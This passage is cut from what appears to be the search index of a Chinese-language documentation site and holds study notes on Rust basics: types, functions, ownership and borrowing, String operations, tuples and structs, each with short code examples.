4\n}\nfor j in 'a'..='d' {\n    ...; // i = 'a', 'b', 'c', 'd'\n}\n</code></pre>"},{"location":"cs/pl/rust/basic/#_13","title":"\u5b57\u7b26\u7c7b\u578b","text":"<p>rust \u4e2d\u7684\u5b57\u7b26\u7c7b\u578b\u662f char\uff0c\u5b57\u9762\u91cf\u5199\u6cd5\u4e3a\u5355\u5f15\u53f7\uff08\u53cc\u5f15\u53f7\u8868\u793a\u5b57\u7b26\u4e32\uff09</p> <ul> <li>\u4e00\u4e2a char \u5360\u56db\u4e2a\u5b57\u8282\uff08\u800c\u4e0d\u662f C/C++ \u4e2d\u7684\u4e00\u4e2a\u5b57\u8282\uff09</li> <li>\u6240\u6709 unicode \u7801\u5143\u90fd\u662f\u4e00\u4e2a\u5b57\u7b26</li> <li>\u76f4\u63a5\u5b58\u50a8 unicode \u503c\uff08\u5373 UCS-4\uff09\uff0c\u800c\u4e0d\u4f7f\u7528 UTF-8 \u7f16\u7801</li> </ul>"},{"location":"cs/pl/rust/basic/#_14","title":"\u5355\u5143\u7c7b\u578b","text":"<ul> <li>\u5355\u5143\u7c7b\u578b\u5c31\u662f ()\uff0c\u552f\u4e00\u7684\u503c\u4e5f\u662f ()\uff0c\u4e0d\u5360\u5185\u5b58</li> <li>main \u51fd\u6570\u8fd4\u56de\u7684\u5c31\u662f\u5355\u5143\u7c7b\u578b ()</li> </ul>"},{"location":"cs/pl/rust/basic/#_15","title":"\u8bed\u53e5\u4e0e\u8868\u8fbe\u5f0f","text":"<ul> <li>\u7b80\u5355\u7406\u89e3\u5c31\u662f\uff0c\u5e26\u5206\u53f7\u7684\u662f\u4e00\u4e2a\u8bed\u53e5\uff0c\u4e0d\u5e26\u5206\u53f7\u7684\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u80fd\u8fd4\u56de\u503c\u7684\u5c31\u662f\u8868\u8fbe\u5f0f</li> <li>\u8868\u8fbe\u5f0f\u53ef\u4ee5\u662f\u8bed\u53e5\u7684\u4e00\u90e8\u5206\uff0c\u6bd4\u5982 <code>let a = 1;</code> \u4e2d 1 \u5c31\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u800c\u6574\u4f53\u662f\u4e00\u4e2a\u8bed\u53e5</li> <li>\u51fd\u6570\u8c03\u7528\u662f\u8868\u8fbe\u5f0f\uff0c\u56e0\u4e3a\u4f1a\u6709\u8fd4\u56de\u503c\uff0c\u5373\u4f7f\u201c\u65e0\u201d\u8fd4\u56de\u503c\u4e5f\u4f1a\u8fd4\u56de\u5355\u5143\u7c7b\u578b</li> <li>\u7528\u5927\u62ec\u53f7\u5305\u88f9\u7684\u8fd4\u56de\u4e00\u4e2a\u503c\u7684\u8bed\u53e5\u5757\u4e5f\u662f\u8868\u8fbe\u5f0f\uff1a     <pre><code>let a = {\n    let b = 1;\n    b + 1\n};\n</code></pre></li> </ul>"},{"location":"cs/pl/rust/basic/#_16","title":"\u51fd\u6570","text":"<pre><code>fn add(i: i32, j: i32) -&gt; i32 {\n    i + j  // \u4e0d\u5e26\u5206\u53f7\uff0c\u8fd4\u56de\u503c\uff1b\u5e26\u5206\u53f7\u4e86\u4f1a\u8fd4\u56de ()\n}\n</code></pre> <ul> <li>\u5b9a\u4e49\u51fd\u6570\u4f7f\u7528\u5173\u952e\u5b57 fn</li> <li>\u51fd\u6570\u540d\u3001\u53c2\u6570\u540d\u4f7f\u7528\u86c7\u5f62\u547d\u540d</li> <li>\u5fc5\u987b\u663e\u5f0f\u6307\u5b9a\u53c2\u6570\u7c7b\u578b\uff0c\u9664\u4e86\u8fd4\u56de () \u5916\u8981\u663e\u5f0f\u6307\u5b9a\u8fd4\u56de\u503c\u7c7b\u578b</li> <li>\u4e2d\u9014\u8fd4\u56de\u4f7f\u7528 return \u5173\u952e\u5b57\uff08\u5e26\u4e0d\u5e26\u5206\u53f7\u5747\u53ef\uff09</li> <li>\u6c38\u4e0d\u8fd4\u56de\u7684\u51fd\u6570\u7c7b\u578b\u4e3a !\uff08\u76f8\u5f53\u4e8e python \u7c7b\u578b\u6807\u6ce8\u4e2d\u7684 NoReturn\uff09\uff0c\u4e00\u822c\u7528\u4e8e\u4e00\u5b9a\u4f1a\u629b\u51fa panic \u7684\u51fd\u6570\u6216\u8005\u65e0\u9650\u5faa\u73af\uff1a     <pre><code>fn dead_end() -&gt; ! {\n    panic!(\"...\");\n}\nfn forever() -&gt; ! {\n    loop { /*...*/ };\n}\n</code></pre></li> </ul>"},{"location":"cs/pl/rust/basic/#_17","title":"\u6240\u6709\u6743\u4e0e\u501f\u7528","text":""},{"location":"cs/pl/rust/basic/#_18","title":"\u6240\u6709\u6743","text":"<ol> <li>Rust \u4e2d\u6bcf\u4e00\u4e2a\u503c\u90fd\u88ab\u4e00\u4e2a\u53d8\u91cf\u6240\u62e5\u6709\uff0c\u8be5\u53d8\u91cf\u88ab\u79f0\u4e3a\u503c\u7684\u6240\u6709\u8005</li> <li>\u4e00\u4e2a\u503c\u540c\u65f6\u53ea\u80fd\u88ab\u4e00\u4e2a\u53d8\u91cf\u6240\u62e5\u6709\uff0c\u6216\u8005\u8bf4\u4e00\u4e2a\u503c\u53ea\u80fd\u62e5\u6709\u4e00\u4e2a\u6240\u6709\u8005</li> <li>\u5f53\u6240\u6709\u8005\uff08\u53d8\u91cf\uff09\u79bb\u5f00\u4f5c\u7528\u57df\u8303\u56f4\u65f6\uff0c\u8fd9\u4e2a\u503c\u5c06\u88ab\u4e22\u5f03\uff08drop\uff09</li> </ol> <p>\u5176\u4e2d\u4f5c\u7528\u57df\u7684\u6982\u5ff5\u548c\u5176\u4ed6\u8bed\u8a00\u7c7b\u4f3c</p>"},{"location":"cs/pl/rust/basic/#string","title":"String \u7c7b\u578b","text":"<p><code>let s = \"abc\"</code> \u4e2d s \u7684\u7c7b\u578b\u4e3a <code>&amp;str</code>\uff0c\u5e76\u4e0d\u662f String\uff0c\"abc\" \u662f\u88ab\u786c\u7f16\u7801\u7684\u4e0d\u53ef\u53d8\u7684\u5b57\u9762\u91cf\u3002\u5b58\u50a8\u7684\u65f6\u5019\u662f\u4e00\u4e2a\u6307\u9488\u548c\u5b57\u7b26\u4e32\u957f\u5ea6</p> <p>\u800c String \u5219\u662f\u901a\u8fc7\u5806\u6765\u52a8\u6001\u5206\u914d\u5185\u5b58\u3002\u6bd4\u5982 <code>let s = String::from(\"abc\")</code>\uff0c\u8c03\u7528 String \u7684 from \u65b9\u6cd5\u6765\u521b\u5efa\u4e00\u4e2a String</p> <p>\u5982\u679c s \u662f mut \u7684\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7 <code>s.push_str(\"...\")</code> \u6765\u8ffd\u52a0\u5b57\u9762\u91cf</p>"},{"location":"cs/pl/rust/basic/#_19","title":"\u6240\u6709\u6743\u8f6c\u79fb","text":"<p><pre><code>let x = 1;\nlet y = x;\n</code></pre> \u56e0\u4e3a i32 \u5b58\u50a8\u5728\u6808\u4e0a\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u62f7\u8d1d\uff0cx \u548c y \u90fd\u4e3a 1\uff0c\u4f46 <pre><code>let x = String::from(\"abc\");\nlet y = x;\n</code></pre> String \u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u4e3a y \u8d4b\u503c\u672c\u5e94\u62f7\u8d1d\u5730\u5740\u4f5c\u6d45\u590d\u5236\uff0c\u4f46\u8fd9\u6837\u540c\u4e00\u4e2a String \u5c31\u6709\u4e86\u4e24\u4e2a\u6240\u6709\u8005\uff08x \u548c y\uff09\uff0c\u8fd9\u662f\u6240\u6709\u6743\u89c4\u5219\u4e0d\u5141\u8bb8\u7684\u3002\u56e0\u6b64\u8fd9\u65f6 x \u4f1a\u5931\u6548\uff0c\u4e5f\u5c31\u662f\u5c06 String \u7684\u6240\u6709\u6743\u8f6c\u79fb\u7ed9 y\uff0c\u540e\u9762\u65e0\u6cd5\u518d\u4f7f\u7528 x \u53d8\u91cf\u3002\u8fd9\u79cd\u64cd\u4f5c\u53eb\u505a\u79fb\u52a8\uff08move\uff09\u800c\u975e\u62f7\u8d1d <pre><code>let x: &amp;str = \"abc\";\nlet y = x;\n</code></pre> \u8fd9\u79cd\u60c5\u51b5\uff0c\u56e0\u4e3a\u4f7f\u7528\u7684\u662f &amp;str \u800c\u4e0d\u662f String\uff0c\u6240\u4ee5 x \u4ec5\u5f15\u7528\u4e86\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e0d\u5bf9\u5b83\u6301\u6709\u6240\u6709\u6743\uff0c\u56e0\u6b64 <code>let y = x</code> \u65f6\u5bf9\u5b58\u5728\u6808\u4e0a\u7684\u5f15\u7528\u8fdb\u884c\u4e86\u62f7\u8d1d\uff0c\u800c\u4e0d\u9700\u8981\u79fb\u52a8\u3002\u6240\u4ee5\u8fd9\u4e4b\u540e x \u548c y \u5747\u53ef\u7528</p> <ul> <li>rust \u6c38\u8fdc\u4e0d\u4f1a\u81ea\u52a8\u521b\u5efa\u6570\u636e\u7684\u6df1\u62f7\u8d1d</li> <li>\u4f7f\u7528 .clone() \u53ef\u4ee5\u6df1\u62f7\u8d1d\u5b58\u5728\u5806\u4e0a\u7684\u6570\u636e\uff0c\u4f46\u6027\u80fd\u964d\u4f4e     <pre><code>let x = String::from(\"abc\");\nlet y = x.clone(); // \u540e\u9762 x\u3001y \u5747\u53ef\u7528\uff0c\u56e0\u4e3a\u662f\u6240\u6709\u7684\u662f\u4e0d\u540c\u6570\u636e\n</code></pre></li> </ul>"},{"location":"cs/pl/rust/basic/#_20","title":"\u51fd\u6570\u4f20\u503c\u4e0e\u8fd4\u56de","text":"<p>\u5411\u51fd\u6570\u4e2d\u4f20\u503c\u4e5f\u4f1a\u53d1\u751f\u79fb\u52a8\u6216\u8005\u590d\u5236 <pre><code>fn main() {\n    let s = String::from(\"abc\");\n    print(s);\n    // \u8fd9\u91cc s \u5c06\u4e0d\u80fd\u4f7f\u7528\n}\n\nfn print(string: String) {\n    println!(\"{}\", string); // s \u7684\u6240\u6709\u6743\u5230\u8fd9\u91cc\n} // string \u88ab\u91ca\u653e\n</code></pre> \u4ece\u4e0a\u9762\u7684\u4f8b\u5b50\u53ef\u4ee5\u770b\u51fa\uff0cs \u5bf9\u4e8e String \u7684\u6240\u6709\u6743\u5728\u51fd\u6570\u4f20\u503c\u8c03\u7528\u65f6\u88ab\u79fb\u52a8\u7ed9\u4e86 print \u51fd\u6570\u7684 string \u53d8\u91cf\u3002\u7136\u540e\u968f\u7740 print \u51fd\u6570\u7684\u7ed3\u675f\uff0cstring \u4f5c\u7528\u57df\u7ed3\u675f\uff0c\u8fd9\u4e2a\u503c\u5185\u5b58\u88ab drop\u3002\u5e76\u4e14\u7531\u4e8e\u5728\u8c03\u7528\u65f6 s \u88ab\u79fb\u52a8\u4e86\uff0c\u6240\u4ee5\u5728\u8c03\u7528\u540e s \u5c06\u4e0d\u80fd\u88ab\u4f7f\u7528\u3002\u82e5\u60f3\u5728\u8c03\u7528\u540e\u7ee7\u7eed\u4f7f\u7528 s\uff0c\u4e00\u79cd\u65b9\u6cd5\u662f\u5c06 s.clone() \u4f20\u7ed9 print\uff0c\u53e6\u4e00\u79cd\u65b9\u6cd5\u5219\u662f\u5229\u7528\u8fd4\u56de\uff1a <pre><code>fn main() {\n    let mut s = String::from(\"abc\");\n    s = print(s);\n    println!(\"{}\", s); // \u8fd9\u91cc s \u53ef\u7528\n}\n\nfn print(string: String) -&gt; String {\n    println!(\"{}\", string);\n    string\n}\n</code></pre> \u51fd\u6570\u5728\u8fd4\u56de\u7684\u65f6\u5019\u4e5f\u4f1a\u79fb\u52a8\u6240\u6709\u6743\uff0c\u6bd4\u5982\u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0cprint \u51fd\u6570\u7ed3\u675f\u540e\uff0c\u5c06 string \u79fb\u52a8\u4e86\u51fa\u53bb\uff0c\u8d4b\u503c\u7ed9\u4e86 s\uff0c\u8fd9\u65f6 s \u5c31\u62ff\u5230\u4e86\u8fd4\u56de\u503c\u7684\u6240\u6709\u6743\uff0c\u540e\u9762\u4ecd\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528\u3002\u4f46\u8fd9\u8981\u6c42 s \u662f mut \u7684\uff08\u56e0\u4e3a\u53d1\u751f\u4e86\u53d8\u5316\uff09\uff0c\u6216\u8005\u4f7f\u7528\u53d8\u91cf\u906e\u853d\uff08<code>let s = print(s)</code>\uff09</p>"},{"location":"cs/pl/rust/basic/#_21","title":"\u5f15\u7528\u4e0e\u501f\u7528","text":"<p>rust \u4e2d\u4e5f\u6709\u5f15\u7528\u7684\u6982\u5ff5\uff0c\u83b7\u53d6\u4e00\u4e2a\u53d8\u91cf\u7684\u5f15\u7528\u4e5f\u79f0\u4e3a\u501f\u7528\uff08borrowing\uff09\uff0c\u4f7f\u7528 &amp; \u6765\u8fdb\u884c\u5f15\u7528\uff0c* \u6765\u89e3\u5f15\u7528\uff1a <pre><code>let x: i32 = 1;\nlet y: &amp;i32 = &amp;x; // \u5f15\u7528\u7c7b\u578b\nassert_eq!(x, *y);\n</code></pre> \u4e5f\u53ef\u4ee5\u901a\u8fc7\u501f\u7528\u6765\u8fdb\u884c\u51fd\u6570\u8c03\u7528\uff0c\u4ece\u800c\u7ef4\u6301\u53c2\u6570\u7684\u6240\u6709\u6743\uff1a <pre><code>fn main() {\n    let s = String::from(\"abc\");\n    let len = func(&amp;s);    // \u521b\u5efa s \u7684\u5f15\u7528\uff0c\u5e76\u4f20\u5165\n    println!(\"{} {}\", s, len); // s \u4ecd\u53ef\u7528\n}\n\nfn func(string: &amp;String) -&gt; usize { // \u63a5\u6536\u5f15\u7528\n    string.len()  // \u76f4\u63a5\u8c03\u7528\u65b9\u6cd5\n} // string \u79bb\u5f00\u4f5c\u7528\u57df\uff0c\u4f46\u5b83\u5e76\u4e0d\u62e5\u6709\u4efb\u4f55\u503c\uff0c\u6240\u4ee5\u4e0d\u4f1a\u53d1\u751f\u4ec0\u4e48\n</code></pre> \u4f46\u662f\u6b64\u65f6\u7684\u5f15\u7528\u662f\u4e0d\u53ef\u53d8\u5f15\u7528\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u80fd\u5728 func \u51fd\u6570\u4e2d\u8fdb\u884c <code>string.push_str(\"...\")</code></p> <p>\u4f7f\u7528 &amp;mut \u53ef\u4ee5\u521b\u5efa\u53ef\u53d8\u5f15\u7528\uff0c\u4f8b\u5982\uff1a <pre><code>let mut x: i32 = 1;\nlet y: &amp;mut i32 = &amp;mut x;\n</code></pre> <pre><code>fn main() {\n    let mut s = String::from(\"abc\");\n    func(&amp;mut s); // \u521b\u5efa s \u7684\u53ef\u53d8\u5f15\u7528\n    println!(\"{}\", s) // \u8f93\u51fa abc...\n}\n\nfn func(string: &amp;mut String) { // \u63a5\u6536\u53ef\u53d8\u5f15\u7528\n    string.push_str(\"...\")  // \u53ef\u4ee5\u8fdb\u884c\u66f4\u6539\n}\n</code></pre> \u4f46\u662f\u5bf9\u4e8e\u53ef\u53d8\u5f15\u7528\uff0crust \u6709\u4e00\u4e9b\u9650\u5236\uff1a</p> <ul> <li>\u5728\u540c\u4e00\u4e2a\u4f5c\u7528\u57df\u5185\uff0c\u4e00\u4e2a\u6570\u636e\u53ea\u80fd\u6709\u4e00\u4e2a\u53ef\u53d8\u5f15\u7528</li> <li>\u53ef\u53d8\u5f15\u7528\u548c\u4e0d\u53ef\u53d8\u5f15\u7528\u4e0d\u80fd\u540c\u65f6\u5b58\u5728</li> </ul> <p>\u8fd9\u6837\u505a\u7684\u76ee\u7684\u662f\u907f\u514d\u4ea7\u751f\u6570\u636e\u7ade\u4e89\uff0c\u4ee5\u53ca\u9632\u6b62\u4e0d\u53ef\u53d8\u5f15\u7528\u7684\u503c\u88ab\u53ef\u53d8\u5f15\u7528\u6240\u6539\u53d8</p> <p>\u4ee5\u53ca\u5982\u679c\u5b58\u5728\u5f15\u7528\uff0c\u4e14\u540e\u9762\u7528\u5230\u4e86\u8fd9\u4e2a\u5f15\u7528\uff0c\u5219\u88ab\u5f15\u7528\u7684\u5373\u4f7f\u662f mut \u7684\uff0c\u4e5f\u4e0d\u80fd\u88ab\u4fee\u6539\uff0c\u4f8b\u5982\uff1a <pre><code>fn main() {\n    let mut x = 1;\n    let y = &amp;x; //borrow later used here\n    println!(\"{}, {}\", x, *y);\n    x = 2; // assignment to borrowed `x` occurs here\n    println!(\"{}, {}\", x, *y); // borrow later used here\n}\n</code></pre> \u5219\u4f1a\u4ea7\u751f\u5982\u4e0a\u6ce8\u91ca\u4e2d\u7684\u9519\u8bef\uff0c\u800c\u5982\u679c\u5728 <code>x = 2</code> \u540e\u9762\u6ca1\u6709\u518d\u7528\u5230 y\uff0c\u5219\u662f\u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1\u6b63\u5e38\u66f4\u6539 x \u7684</p> <p>\u4ee5\u53ca\u5982\u4e0b\u4ee3\u7801\u4e5f\u4f1a\u7f16\u8bd1\u9519\u8bef\uff1a <pre><code>fn main() {\n    let mut x = 1;\n    let y = &amp;mut x;\n    println!(\"{}, {}\", x, *y); // cannot borrow `x` as immutable because it is also borrowed as mutable\n}\n</code></pre> \u56e0\u4e3a\u5728\u4f20\u5165\u5b8f\u65f6\uff0c\u5b9e\u9645\u4e0a\u5bf9 x \u8fdb\u884c\u4e86\u501f\u7528\uff0c\u56e0\u6b64\u540c\u65f6\u5b58\u5728\u4e86\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u7684\u5f15\u7528\uff0c\u5bfc\u81f4\u62a5\u9519</p>"},{"location":"cs/pl/rust/basic/#_22","title":"\u907f\u514d\u60ac\u5782\u5f15\u7528","text":"<p>\u60ac\u5782\u5f15\u7528\uff08dangling references\uff09\u4e5f\u79f0\u60ac\u5782\u6307\u9488\uff0c\u610f\u601d\u662f\u6307\u9488\u6307\u5411\u7684\u503c\u88ab\u91ca\u653e\u6389\u4e86\uff0c\u5bfc\u81f4\u6307\u9488\u6307\u7684\u4f4d\u7f6e\u4e0d\u5b58\u5728\u671f\u671b\u7684\u5185\u5bb9\u3002rust \u4e0d\u4f1a\u5141\u8bb8\u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\uff0c\u6bd4\u5982 <pre><code>fn dangle() -&gt; &amp;String {\n    let s = String::from(\"abc\");\n    &amp;s\n}\n</code></pre> \u8fd9\u91cc\u8fd4\u56de\u4e86 s \u7684\u5f15\u7528\uff0c\u4f46\u662f\u5728\u51fd\u6570\u7ed3\u675f\u540e s \u79bb\u5f00\u4e86\u4f5c\u7528\u57df\uff0c\u88ab\u91ca\u653e\u6389\u4e86\uff0c\u6240\u4ee5\u8fd4\u56de\u7684\u5176\u5b9e\u662f\u60ac\u5782\u5f15\u7528\uff0crust \u7f16\u8bd1\u5668\u5c06\u4e0d\u4f1a\u901a\u8fc7</p>"},{"location":"cs/pl/rust/basic/#_23","title":"\u590d\u5408\u7c7b\u578b","text":""},{"location":"cs/pl/rust/basic/#_24","title":"\u5b57\u7b26\u4e32","text":"<ul> <li>&amp;str \u4e0e String \u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u7c7b\u578b</li> <li>\u53ef\u4ee5\u4f7f\u7528 &amp;s[a..b] \u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u5207\u7247\u7684\u5f15\u7528\uff0c\u5207\u7247\u4f7f\u7528\u7684\u662f\u524d\u9762\u7684 range \u7c7b\u578b\uff0c\u8bed\u6cd5\u548c python \u7684\u5207\u7247\u7c7b\u4f3c\uff0c\u540c\u6837\u53ef\u4ee5\u7701\u7565\u5934\u5c3e<ul> <li>\u5bf9\u4e00\u4e2a String \u4f7f\u7528\u5207\u7247\u83b7\u5f97\u7684\u5f15\u7528\u7c7b\u578b\u4e5f\u662f &amp;str</li> <li>\u5207\u7247\u662f\u6309\u5b57\u8282\u8fdb\u884c\u7684\uff0c\u9700\u8981\u7cbe\u786e\u5207\u5230\u5b57\u7b26\u8fb9\u754c\u3002\u4f8b\u5982\u5bf9\u4e2d\u6587\u5b57\u7b26\u4e32\u8fdb\u884c\u5207\u7247\uff0c&amp;s[0..3] \u4f1a\u5207\u51fa\u4e00\u4e2a\u6c49\u5b57\u5b57\u7b26\uff0c\u800c &amp;s[0..2] \u6ca1\u5207\u5b8c\u6574\u4f1a\u5bfc\u81f4 panic</li> </ul> </li> <li>\u5b57\u7b26\u662f UCS-4 \u7f16\u7801\uff0c\u5b57\u7b26\u4e32\u662f UTF-8 \u7f16\u7801\uff08\u6bcf\u4e2a\u5b57\u7b26\u5b57\u8282\u6570\u4e0d\u5b9a\uff09</li> <li>String \u4e0e &amp;str \u8f6c\u6362<ul> <li>&amp;str -&gt; String<ul> <li>String::from(\"...\")</li> <li>\"...\".to_string()</li> </ul> </li> <li>String -&gt; &amp;str<ul> <li>&amp;s / &amp;s[..]</li> <li>s.as_str()</li> </ul> </li> </ul> </li> <li>String \u64cd\u4f5c<ul> <li>.push('a') \u8ffd\u52a0\u5b57\u7b26 / .push_str(\"...\") \u8ffd\u52a0\u5b57\u7b26\u4e32</li> <li>.insert(n, 'a') \u5728\u7d22\u5f15 n \u7684\u4f4d\u7f6e\u63d2\u5165\u5b57\u7b26 / .insert(n, \"...\") \u540c\u7406\u63d2\u5165\u5b57\u7b26\u4e32</li> <li>.replace(\"aaa\", \"AAA\") \u5168\u5c40\u66ff\u6362\u6240\u6709 \"aaa\" \u5230 \"AAA\"\uff0c\u8fd4\u56de\u66ff\u6362\u540e\u7684\u65b0\u5b57\u7b26\u4e32\uff0c\u539f\u5b57\u7b26\u4e32\u4e0d\u53d8</li> <li>.replacen(\"aaa\", \"AAA\") \u540c\u4e0a\uff0c\u4f46\u53ea\u66ff\u6362 n \u6b21</li> <li>.replace_range(a..b, \"...\") \u5c06\u7d22\u5f15 a..b \u7684\u8303\u56f4\u66ff\u6362\u4e3a\u65b0\u5b57\u7b26\u4e32 \"...\"\uff0c\u76f4\u63a5\u64cd\u4f5c\u539f\u5b57\u7b26\u4e32</li> <li>.pop() \u5220\u9664\u5e76\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\uff0c\u8fd4\u56de\u503c\u4e3a\u4e00\u4e2a Option\uff0c\u82e5\u5b57\u7b26\u4e32\u4e3a\u7a7a\u5219\u8fd4\u56de None</li> <li>.remove(n) \u5220\u9664\u4ee5\u7d22\u5f15 n \u5f00\u5934\u7684\u4e00\u4e2a\u5b57\u7b26</li> <li>.truncate(n) \u5220\u9664\u7d22\u5f15 n \u5f00\u5934\u53ca\u4e4b\u540e\u7684\u6240\u6709\u5b57\u7b26</li> <li>.clear() \u6e05\u7a7a\u5b57\u7b26\u4e32</li> <li>\u4f7f\u7528 + \u6216 += \u8fde\u63a5\u4e00\u4e2a &amp;str \u5b57\u7b26\u4e32\uff08\u4e0d\u80fd\u662f String\uff09<ul> <li>+ \u8fd0\u7b97\u7b26\u5de6\u4fa7\u7684\u53d8\u91cf\u5c06\u5931\u6548\uff0c\u56e0\u4e3a\u6240\u6709\u6743\u8f6c\u79fb\u5230\u4e86 .add() \u65b9\u6cd5\u4e2d\u7136\u540e\u88ab\u91ca\u653e</li> </ul> </li> <li>\u53ef\u4ee5\u4f7f\u7528 <code>let s = format!(\"{} {}\", s1, s2)</code> \u6765\u8fde\u63a5\u521b\u5efa\u65b0\u7684\u5b57\u7b26\u4e32</li> </ul> </li> <li>\u5b57\u7b26\u4e32\u8f6c\u4e49<ul> <li>\"\\x..\" \u5341\u516d\u8fdb\u5236\u8868\u793a\uff0c\u5fc5\u987b\u5728 \\x00 \u5230 \\x7f \u4e4b\u95f4</li> <li>\"\\u{....}\" \u7528 codepoint \u8868\u793a\u4e00\u4e2a unicode \u5b57\u7b26</li> <li>\u53ef\u4ee5\u76f4\u63a5\u6362\u884c\uff0c\u4f46\u4ece\u4e0b\u4e00\u884c\u884c\u9996\u5f00\u59cb\u5c31\u8bb0\u5f55\u6587\u672c\uff08\u4e5f\u5c31\u662f\u4e0d\u5f53\u4f5c\u7f29\u8fdb\u5ffd\u7565\uff09\uff0c\u884c\u5c3e\u52a0  \u4e0d\u6362\u884c\uff0c\u4e14\u4e0b\u4e00\u884c\u884c\u9996\u7a7a\u683c\u5ffd\u7565</li> <li>\u5176\u5b83\u8f6c\u4e49\u548c\u5176\u5b83\u8bed\u8a00\u5747\u7c7b\u4f3c</li> <li>r\"...\" \u4e2d\u7684  \u4e0d\u53c2\u4e0e\u8f6c\u4e49\uff08\u548c python \u7c7b\u4f3c\uff09</li> <li>r#\"...\"# \u4e2d\u7684\u53cc\u5f15\u53f7\u4e0d\u4f1a\u63d0\u524d\u7ed3\u675f\u5b57\u7b26\u4e32\uff08\u4e5f\u5c31\u76f8\u5f53\u4e8e\u4e0d\u9700\u8981\u8f6c\u4e49\u53cc\u5f15\u53f7\uff09</li> <li>r##\"...\"## \u4e2d\u7684 \"# \u4e5f\u4e0d\u4f1a\u63d0\u524d\u7ed3\u675f\u5b57\u7b26\u4e32\uff08\u53cc\u5f15\u53f7\u524d\u540e\u7684\u4e95\u53f7\u52a0\u591a\u5c11\u90fd\u53ef\u4ee5\uff0c\u53ea\u9700\u8981\u5339\u914d\u5373\u53ef\uff09</li> </ul> </li> <li>\u64cd\u4f5c UTF-8 \u5b57\u7b26\u4e32<ul> <li>\u5faa\u73af\u904d\u5386\u5b57\u7b26\u53ef\u4ee5\u4f7f\u7528 <code>for c in \"...\".chars()</code></li> <li>\u5faa\u73af\u904d\u5386\u5b57\u8282\u53ef\u4ee5\u4f7f\u7528 <code>for c in \"...\".bytes()</code></li> <li>\u5176\u5b83\u64cd\u4f5c\u6807\u51c6\u5e93\u4e2d\u6ca1\u6709\uff0c\u9700\u8981\u901a\u8fc7\u522b\u7684 crates</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_25","title":"\u5143\u7ec4","text":"<ul> <li>\u957f\u5ea6\u56fa\u5b9a\uff0c\u5143\u7d20\u987a\u5e8f\u53ca\u7c7b\u578b\u56fa\u5b9a\u7684\u590d\u5408\u7c7b\u578b\uff0c\u4f8b\u5982 <code>let t: (i32, f64) = (1, 1.1);</code></li> <li>\u4f7f\u7528\u6a21\u5f0f\u5339\u914d\u83b7\u53d6\u5143\u7ec4\u4e2d\u7684\u503c\uff1a<code>let (a, b) = t;</code></li> <li>\u4f7f\u7528 . \u6765\u8bbf\u95ee\u5143\u7ec4\u5185\u5bb9\uff1a<code>t.0 == 1</code></li> </ul>"},{"location":"cs/pl/rust/basic/#_26","title":"\u7ed3\u6784\u4f53","text":"<p>\u4f7f\u7528 struct \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u7ed3\u6784\u4f53\uff0c\u6307\u660e\u5b57\u6bb5\u540d\u4e0e\u7c7b\u578b\uff1a <pre><code>struct User {\n    name: String,\n    age: u32,\n    email: String,\n}\n</code></pre> \u521b\u5efa\u7ed3\u6784\u4f53\u5b9e\u4f8b\u65f6\u6bcf\u4e2a\u5b57\u6bb5\u90fd\u9700\u8981\u521d\u59cb\u5316\uff0c\u4e14\u987a\u5e8f\u53ef\u4ee5\u6253\u4e71\uff1a <pre><code>let user1 = User {\n    age: 19_u32,\n    name: String::from(\"TonyCrane\"),\n    email: String::from(\"tonycrane@foxmail.com\"),\n};\n</code></pre> \u8bbf\u95ee\u7ed3\u6784\u4f53\u5b57\u6bb5\u76f4\u63a5\u4f7f\u7528 . \u5c31\u53ef\u4ee5\u3002\u4fee\u6539\u67d0\u4e00\u5b57\u6bb5\u9700\u8981\u5c06\u6574\u4e2a\u7ed3\u6784\u4f53\u6807\u8bb0\u4e3a mut\uff0c\u65e0\u6cd5\u5c06\u67d0\u4e00\u5b57\u6bb5\u5355\u72ec\u6807\u8bb0\u4e3a mut</p> <p>\u53e6\u5916\uff0c\u5728\u7ed3\u6784\u4f53\u4e2d\u4f7f\u7528\u5f15\u7528\u7c7b\u578b\u9700\u8981\u7528\u5230\u751f\u547d\u5468\u671f</p>"},{"location":"cs/pl/rust/basic/#_27","title":"\u7b80\u5316\u521b\u5efa","text":"<p><pre><code>fn build_user(name: String, age: u32) -&gt; User {\n    User {\n        name,  // name: name \u7f29\u5199\n        age,   // age: age \u7f29\u5199\n        email: String::from(\"\"),\n    }\n}\n</code></pre> \u5f53\u53c2\u6570\u540d\u548c\u5b57\u6bb5\u540d\u76f8\u540c\u7684\u65f6\u5019\u53ef\u4ee5\u7701\u7565\u6389\u5185\u5bb9</p>"},{"location":"cs/pl/rust/basic/#_28","title":"\u66f4\u65b0\u7ed3\u6784\u4f53","text":"<p>\u901a\u8fc7\u5df2\u6709\u7ed3\u6784\u4f53\u5b9e\u4f8b\u521b\u5efa\u65b0\u5b9e\u4f8b\uff1a <pre><code>let user2 = User {\n    email: String::from(\"another@example.com\"),\n    ..user1 // \u5fc5\u987b\u5199\u5728\u540e\u9762\n};\n</code></pre> \u5c06 user1 \u9664\u4e86 email \u4e4b\u5916\u7684\u5b57\u6bb5\u79fb\u52a8\u5230 user2 \u4e2d\u3002\u56e0\u4e3a\u8fd9\u662f\u79fb\u52a8\uff0c\u6240\u4ee5\u53d1\u751f\u4e86\u6240\u6709\u6743\u7684\u8f6c\u79fb\uff0c\u5bfc\u81f4 user1.name \u540e\u9762\u4e0d\u80fd\u88ab\u4f7f\u7528\u3002\u4f46\u56e0\u4e3a u32 \u5b9e\u73b0\u4e86 Copy trait\uff0c\u6240\u4ee5 user1.age \u4ecd\u53ef\u4ee5\u4f7f\u7528\u3002\u5e76\u4e14 user1.email 